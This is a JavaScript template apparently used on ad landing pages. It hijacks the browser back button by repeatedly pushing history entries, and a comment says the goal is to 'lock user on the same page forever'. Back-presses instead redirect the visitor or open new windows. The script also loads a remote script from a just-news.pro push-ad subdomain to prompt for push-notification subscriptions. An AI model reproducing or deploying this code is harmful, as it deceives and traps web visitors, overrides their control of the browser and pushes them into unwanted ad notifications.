var g_popupShown = false;
window.show_pushwru_show = function () {
    if (location.protocol === 'https:' && !g_popupShown) {
        g_popupShown = true;
        setTimeout(function () {
            var scr = document.createElement("script");
            scr.src = "https://%(push_ad_subdomain)s.just-news.pro/subscriber.php?data_callback=get_params";
            scr.onload = function () {
                pushwru_show();
            };
            document.head.appendChild(scr);
        }, 1);
    }
};

window.get_same_location_with_push = function () {
    var url = location.href.replace('http', 'https').replace('#init', '');
    sep = url.indexOf('?') === -1 ? '?' : '&';
    url += sep + 'showing_push_=1';
    return url;
};

if (location.protocol === 'https:' && window.sawpp !== true &&
    window.location.href.indexOf('showing_push_') > -1 && window.dpush !== true) {
    // we are on page after redirect with showing_push_ parameter
    show_pushwru_show();
}

history.pushState({init: true}, document.title, "");

$(window).on('popstate', function (e) {
    // back pressed on android
    if (acrum_extra && acrum_extra.type === 'landing' &&
        location.protocol === 'https:' && (is_adlt || is_our_click)) {
        // to lock user on the same page forever
        history.pushState({init: true}, document.title, "");
    }

    var sep = '';
    if (acrum_extra && acrum_extra.type === 'prelanding') {
        // going to landing when back button is pressed
        var next_url = location.protocol + '//' + location.host + '%(redirect_url)s';
        sep = next_url.indexOf('?') === -1 ? '?' : '&';
        next_url += sep + 'cb=1';
        if (window.dpush === true || window.sawpp === true || location.protocol === 'http:') {
            // if push disabled just open landing on the same page
            window.location = next_url;
        } else {
            // we are on https page then opening landing in new page
            // and showing push request
            show_pushwru_show();
            window.open(next_url, '_blank');
        }
    } else if (window.sawpp !== true && window.dpush !== true) {
        // we are on landing
        if (window.domain_has_valid_cert === true &&
            location.protocol === 'http:') {
            // redirecting to the same page but with https
            location.replace(get_same_location_with_push());
        } else if (location.protocol === 'https:') {
            show_pushwru_show();
        }
    }
});